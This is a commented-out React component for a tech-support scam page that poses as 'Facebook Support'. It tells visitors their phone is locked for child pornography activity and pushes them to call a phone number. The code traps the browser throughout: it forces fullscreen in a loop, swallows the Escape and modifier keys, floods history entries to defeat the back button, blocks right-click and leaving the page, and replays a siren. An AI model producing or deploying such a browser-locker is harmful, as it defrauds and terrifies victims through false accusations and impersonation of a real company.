//       localStorage.setItem("emergencyAlertActive", "true")
//     } else {
//       localStorage.removeItem("emergencyAlertActive")
//     }
//   }, [showPopup])

//   const activateEmergencyMode = () => {
//     setShowPopup(true)
//     document.body.style.overflow = "hidden"
//     playAlertSound()
//     startSoundInterval()
//     showEmergencyToasts()
//     requestFullscreen()
//   }

//   const playAlertSound = useCallback(() => {
//     const audio = new Audio("/siren-alert-96052 (1).mp3")
//     audio.play()
//   }, [])

//   const startSoundInterval = () => {
//     if (window.emergencyIntervalId) {
//       clearInterval(window.emergencyIntervalId)
//     }

//     const intervalId = setInterval(() => {
//       playAlertSound()
//     }, 10000)

//     window.emergencyIntervalId = intervalId
//     return intervalId
//   }

//   // const handleCall = () => {
//   //   activateEmergencyMode()
//   // }

//   const handleCall = () => {
//   activateEmergencyMode()
//   window.location.href = "tel:18445131621"
// }


//   useEffect(() => {
//     const handleKeyDown = (e) => {
//       if (e.key === "Escape") {
//         e.preventDefault()
//         e.stopPropagation()
        
//         // Immediately request fullscreen again
//         setTimeout(() => {
//           requestFullscreen()
//           // Create a new nested emergency call
//           setNestedCalls(prev => [...prev, Date.now()])
          
//           // Visual feedback
//           const popup = document.getElementById("emergencyPopup")
//           if (popup) {
//             popup.classList.add("shake-animation")
//             setTimeout(() => {
//               popup.classList.remove("shake-animation")
//             }, 500)
//             playAlertSound()
//           }
//         }, 0)
//         return false
//       }

//       if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
//         e.preventDefault()
//         e.stopPropagation()
//         return false
//       }
//     }

//     window.addEventListener("keydown", handleKeyDown, { capture: true })

//     return () => {
//       window.removeEventListener("keydown", handleKeyDown, { capture: true })
//     }
//   }, [showPopup, playAlertSound])

//   useEffect(() => {
//     if (showPopup) {
//       const maxBackBlockCount = 100
//       let backBlockCount = 0

//       const pushManyHistoryStates = () => {
//         if (backBlockCount < maxBackBlockCount) {
//           window.history.pushState({ emergency: true }, document.title, window.location.href)
//           backBlockCount++
//           setTimeout(pushManyHistoryStates, 50)
//         }
//       }

//       pushManyHistoryStates()

//       const handlePopState = () => {
//         window.history.pushState({ emergency: true }, document.title, window.location.href)
//         playAlertSound()
//         if (!isFullscreen) {
//           requestFullscreen()
//         }
//       }

//       window.addEventListener("popstate", handlePopState)

//       const handleBeforeUnload = (e) => {
//         e.preventDefault()
//         e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
//         return e.returnValue
//       }

//       window.addEventListener("beforeunload", handleBeforeUnload)

//       const handleContextMenu = (e) => {
//         e.preventDefault()
//         return false
//       }

//       document.addEventListener("contextmenu", handleContextMenu)

//       // Keep checking fullscreen status and focus
//       const maintenanceInterval = setInterval(() => {
//         if (!isFullscreen) {
//           requestFullscreen()
//         }
//         if (document.activeElement !== document.getElementById("emergencyPopup")) {
//           document.getElementById("emergencyPopup")?.focus()
//         }
//       }, 100)

//       return () => {
//         window.removeEventListener("popstate", handlePopState)
//         window.removeEventListener("beforeunload", handleBeforeUnload)
//         document.removeEventListener("contextMenu", handleContextMenu)
//         clearInterval(maintenanceInterval)
//       }
//     }
//   }, [showPopup, playAlertSound, isFullscreen])

//   useEffect(() => {
//     if (showPopup) {
//       const style = document.createElement("style")
//       style.id = "emergency-styles"
//       style.innerHTML = `
//         @keyframes shake {
//           0%, 100% { transform: translateX(0); }
//           10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
//           20%, 40%, 60%, 80% { transform: translateX(10px); }
//         }
//         .shake-animation {
//           animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
//         }
//         @keyframes flash-blue {
//           0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
//           50% { background-color: rgba(59, 130, 246, 0.9); }
//         }
//         .flash-notification {
//           animation: flash-blue 1s infinite;
//         }
//         .fullscreen-notification {
//           position: fixed;
//           top: 0;
//           left: 0;
//           right: 0;
//           padding: 8px 16px;
//           height: 100px;
//           background-color:  #007bff;
//           color: white;
//           text-align: center;
//           font-weight: bold;
//           z-index: 9999;
//           font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
//           font-size: 14px;
//           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
//           display: flex;
//           align-items: center;
//           justify-content: center;
//           backdrop-filter: blur(10px);
//         }
//         .fullscreen-indicator {
//           display: inline-block;
//           width: 80px;
//           height: 200px;
//           background-color: white;
//           border-radius: 50%;
//           margin-right: 8px;
//         }
//       `
//       document.head.appendChild(style)

//       return () => {
//         document.head.removeChild(style)
//       }
//     }
//   }, [showPopup])

//   // const createVisualDistraction = () => {
//   //   if (!showPopup) return null

//   //   return (
//   //     <>
//   //       <div className="fullscreen-notification flash-notification" onClick={handleCall}>
//   //         <span className="fullscreen-indicator animate-ping"></span>
//   //         <Lock size={96} className="mr-1" />
//   //         Facebook SECURITY - SCREEN LOCKED
//   //       </div>

//   //       <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
//   //         <div className="animate-pulse flex items-center">
//   //           <AlertCircle size={24} className="text-white mr-2" />
//   //           <span className="text-white font-bold">Facebook SECURITY ALERT</span>
//   //         </div>
//   //       </div>

//   //       <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
//   //         <AlertCircle size={16} />
//   //       </div>
//   //       <div
//   //         className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
//   //         style={{ animationDelay: "0.5s" }}
//   //       >
//   //         <AlertCircle size={16} />
//   //       </div>
//   //     </>
//   //   )
//   // }

//   return (
//     <>
//       <div
//         ref={fullscreenRef}
//         className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
//         onClick={handleCall}
//         style={{ 
//           transform: `scale(${1 - depth * 0.05})`,
//           zIndex: 1000 + depth
//         }}
//       >
//         <ToastContainer position="top-right" autoClose={5000} />
//         {/* {createVisualDistraction()} */}
//         <div className="w-full max-w-md">
//           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
//             <div className="flex flex-col items-center space-y-4">
//               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
//                 <PhoneCall size={48} className="text-white" />
//               </div>
//               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
//               <p className="text-base md:text-lg text-muted-foreground"><br></br>
//            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
//            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
//             <br /><br />
//           </p>
//               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
//               <Button
//                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
//                 onClick={(e) => {
//                   e.stopPropagation()
//                   handleCall()
//                 }}
//               >
//                 <PhoneCall className="mr-2 h-6 w-6" />
//                 <span>Call 18445131621</span>
//               </Button>
//             </div>
//           </Card>
//         </div>

//         {showPopup && (
//           <div
//             id="emergencyPopup"
//             ref={popupRef}
//             className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
//             tabIndex={-1}
//             onKeyDown={(e) => {
//               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
//                 e.preventDefault()
//                 e.stopPropagation()
//               }
//             }}
//             onClick={(e) => e.stopPropagation()}
//           >
//             <div className="absolute inset-0 bg-black bg-opacity-60"></div>
//             <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
//               <div className="flex flex-col items-center space-y-4">
//                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
//                   <AlertCircle size={32} className="text-white" />
//                 </div>
//                 <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
//                 <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
//                 <p className="text-2xl font-semibold text-blue-600">18445131621</p>
//                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
//                 </div>
//                 <Button
//                   id="callButton"
//                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
//                   onClick={() => (window.location.href = "tel:18445131621")}
//                   autoFocus
//                 >
//                   Confirm Call
//                 </Button>
//                 <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
//               </div>
//             </Card>
//           </div>
//         )}
//       </div>
//       {nestedCalls.map((id) => (
//         <EmergencyCallRecursive key={id} depth={depth + 1} />
//       ))}
//     </>
//   )
// }

// export default function EmergencyCall() {
//   return <EmergencyCallRecursive />
// }